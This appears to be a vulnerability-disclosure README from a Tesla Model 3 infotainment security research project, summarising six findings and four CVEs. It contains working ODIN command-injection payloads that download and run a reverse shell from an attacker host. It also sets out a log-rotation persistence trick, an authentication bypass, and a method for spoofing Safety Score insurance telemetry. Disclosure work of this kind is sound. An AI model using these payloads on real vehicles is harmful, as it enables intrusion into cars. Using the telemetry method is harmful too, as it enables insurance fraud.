# Tesla Security Research

Vulnerability research on the Tesla Model 3/Y infotainment system (Intel Atom MCU, Linux 4.14.235), responsibly disclosed to Tesla via Bugcrowd.

Obtained persistent root access on a production Tesla Model 3 through a command injection vulnerability in Tesla's ODIN diagnostic interface ([CVE-2022-42008](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42008)). From there, discovered five additional vulnerabilities — including a persistence method that survives firmware updates ([CVE-2022-42005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42005), [CVE-2022-42006](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42006)) and a method to spoof Safety Score insurance telemetry that directly reduced monthly premiums from $130 to $83.

Six vulnerabilities across ODIN, hermes, and Safety Score. Four CVEs. Rewarded via Bugcrowd and enrolled in Tesla's SSH Security Researcher program.

## Vulnerability Summary

| Finding | CVE | Impact | Status | Reward |
|---------|-----|--------|--------|--------|
| [Root Shell via ODIN](01-ROOT-SHELL-VIA-ODIN.md) | CVE-2022-42008 | Root shell via command injection | Fixed (2021.32.10) | Bugcrowd bounty |
| [Expired ODIN Tokens](02-EXPIRED-ODIN-TOKENS.md) | CVE-2022-42007 | Token replay via NTP spoofing | Fixed (2021.32.10) | Bugcrowd bounty |
| [Upload to Mothership](03-UPLOAD-TO-MOTHERSHIP.md) | — | Arbitrary file upload to Tesla servers | Marked N/A | — |
| [Log Backshell + DV Access](04-LOG-BACKSHELL-AND-DV-ACCESS.md) | CVE-2022-42005, CVE-2022-42006 | Persistent access surviving firmware updates | Fixed | Bugcrowd bounty |
| [Insurance Telemetry Spoofing](05-INSURANCE-TELEMETRY-SPOOFING.md) | — | Spoofed Safety Score reduces insurance premiums | No fix confirmed | — |
| [Unfuse ODIN](06-UNFUSE-ODIN.md) | — | Any ODIN task without authentication | No fix confirmed | — |

## Architecture

The Tesla Model 3/Y infotainment system (Intel Atom MCU) runs a Linux-based OS with several attack surfaces identified during this research:

```
┌──────────────────────────────────────────────────────────┐
│                  Tesla Model 3 MCU (Intel)               │
│                                                          │
│  ┌────────────┐  ┌──────────────┐  ┌──────────────────┐  │
│  │   ODIN     │  │  QtCarServer │  │  hermes          │  │
│  │            │  │              │  │  (proxy+client)  │  │
│  │  CVE-42008 │  │  prototype_  │  │                  │  │
│  │  (cmd inj) │  │  server      │  │  Uploads to      │  │
│  │            │  │  CVE-42006   │  │  Mothership      │  │
│  │  Report 06 │  │  (data vals) │  │  [Report 03]     │  │
│  │  (is-fused │  │              │  │  [Report 05]     │  │
│  │   bypass)  │  └──────────────┘  └────────┬─────────┘  │
│  └──────┬─────┘                             │            │
│         │        ┌──────────────┐           │            │
│         │        │ svlogd       │           │            │
│         │        │ Log Rotation │           │            │
│         │        │ CVE-42005    │           │            │
│         │        │ (persistence)│           │            │
│         │        └──────────────┘           │            │
└─────────┼───────────────────────────────────┼────────────┘
          │                                   │
    ┌─────┴───────┐                   ┌───────┴──────────┐
    │  Toolbox    │                   │   Mothership     │
    │  API        │                   │   Server         │
    │             │                   │                  │
    │  CVE-42007  │                   │  File uploads    │
    │  (expired   │                   │  Telemetry data  │
    │   tokens)   │                   │                  │
    └─────────────┘                   └──────────────────┘
```

## Obtaining Root + Persistence

The ODIN diagnostic interface exposes a task called `TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK` that accepts a `MicTest-Input` parameter — a list of strings passed directly to `CID_EXEC` for execution as root. Any subscriber with the lowest Toolbox access level (`tbx-external`) can trigger this task by connecting to the car's diagnostic port and sending a POST request. The input strings are executed verbatim, so the attack is two requests: first, download a reverse shell script onto the car via curl:

```json
{
    "args": {
        "kw": {
            "MicTest-Input": ["curl", "http://<ATTACKER_IP>/shell.sh", "-o", "/home/tesla/shell.sh"]
        },
        "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"
    },
    "command": "execute"
}
```

Then execute it:

```json
{
    "args": {
        "kw": {
            "MicTest-Input": ["/bin/sh", "/home/tesla/shell.sh"]
        },
        "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"
    },
    "command": "execute"
}
```

With a root shell established, persistent access is achieved by hijacking the svlogd log rotation configuration. The standard gzip compression command is replaced with a script that opens a backshell under the `log` account each time logs rotate:

```
!sh /var/log/wpa_supplicant/gzip.sh -c
```

The config file is made immutable with `chattr +i`, ensuring it survives firmware updates. While the `log` account cannot use the standard `sdv` command to set data values (dbus rejects it), Tesla's dormant `prototype_server` provides unrestricted websocket access to all data values when enabled via `settings.conf`. A custom set of shell scripts ([sdv](tools/sdv), [lv](tools/lv), [send.sh](tools/send.sh)) emulate a websocket client to interact with this server.

The full persistence toolkit is controlled through the car's Access Code input box (visible by long-pressing the car model on the touchscreen), which is monitored by a [listener script](tools/listen.sh) that dispatches commands — including opening backshells, setting data values, and toggling service modes.

## Independent Findings

### Expired ODIN Tokens + NTP Spoofing (CVE-2022-42007)

Tesla's ODIN token generation endpoint accepts expired `tbx-tokens` and — critically — also returns the user's `tbx-token` in the response, enabling token leakage through sharing. Expired ODIN tokens are normally rejected by the vehicle, but by spoofing the car's NTP time source using ARP-based interception ([ntpspoof.py](tools/ntpspoof.py)), the vehicle can be tricked into accepting tokens past their expiration date. The gateway detects NTP tampering (`GTW_w149_rtcTimeSetInPast`) but does not act on this signal.

### Upload to Mothership

Using the car's certificates from `/var/lib/car_creds/`, the `hermes_proxy` service can be started on a local machine, providing direct access to Tesla's Mothership server. The profile backup endpoint (`/vehicles/${VIN}/computer_profile`) accepts arbitrary file uploads with no validation — a single curl command uploads any file to Tesla's production infrastructure. Tesla marked this finding as N/A ("working as intended").

### Insurance Telemetry Spoofing

Tesla's Safety Score system collects driving telemetry from the MCU and uploads it to Mothership for insurance premium calculations. With root access, a perfect-score telemetry sample can be captured, its protobuf-encoded odometer values inflated via hex editing (using the reverse-engineered schema at [telemetry.proto](tools/telemetry.proto)), and the modified samples re-uploaded. Two fabricated trips were accepted by Mothership — one showing ~2,700 miles in 3.5 hours — directly reducing monthly insurance premiums from $130 to $83. The fundamental issue is that telemetry originates from the MCU (user-accessible) rather than the APE3 autopilot unit (hardened). Tesla did not issue a bounty for this finding.

### ODIN Authentication Bypass

With root access, bind-mounting a fake `is-fused` script over `/usr/bin/is-fused` and restarting the ODIN services causes ODIN to believe the unit is in factory/development mode. In this state, any ODIN task can be executed without authentication tokens — including tasks that could disable the car alarm (`PROC_ICE_X_SET-DATA-VALUE`), wipe the VIN (`PROC_ICE_X_DEASSOCIATE-PRODUCT-ID`), or potentially engage safety-critical vehicle functions.

## Tools

| Tool | Description |
|------|-------------|
| [ntpspoof.py](tools/ntpspoof.py) | ARP-based NTP spoofing to replay expired ODIN tokens (Python/scapy) |
| [telemetry.proto](tools/telemetry.proto) | Reverse-engineered protobuf schema for Tesla Safety Score telemetry (34 fields) |
| [listen.sh](tools/listen.sh) | Access Code box command listener — covert command interface via touchscreen |
| [sdv](tools/sdv) | Set data value via prototype_server websocket |
| [lv](tools/lv) | Get data value via prototype_server websocket |
| [send.sh](tools/send.sh) | Websocket frame construction for prototype_server communication |

## Disclaimer

This research was conducted as part of responsible security research and reported to Tesla's Bug Bounty Program via Bugcrowd. All vulnerabilities with assigned CVEs have been patched in current firmware versions. This repository is published for educational purposes only.

As a result of this research, the team was awarded financial bounties via Bugcrowd and enrolled in Tesla's SSH Security Researcher program, receiving signed SSH certificates for continued research access.

## References

- [CVE-2022-42008](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42008) — Root Shell via ODIN
- [CVE-2022-42007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42007) — Expired ODIN Tokens
- [CVE-2022-42006](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42006) — Prototype Server Data Value Access
- [CVE-2022-42005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42005) — Persistent Log Shell
- [Tesla Hacking: Part 1 — Obtaining Root on a Tesla Model 3](https://sourcehat.com/blog/obtaining-root-on-a-tesla-model-3-with-persistent-access/)
- [Tesla Hacking: Part 2 — Spoofing Tesla Insurance Telemetry Data](https://sourcehat.com/blog/spoofing-tesla-insurance-safety-score-telemetry-data/)
- [Tesla Security](https://www.tesla.com/legal/security-research)

## Researchers

- **Matthew C. Pilsbury**
- **Alex Harbuzenko**
- **Oleg Kutkov**
- **Tristan Rice**

Research conducted on behalf of SourceHat Labs Inc.
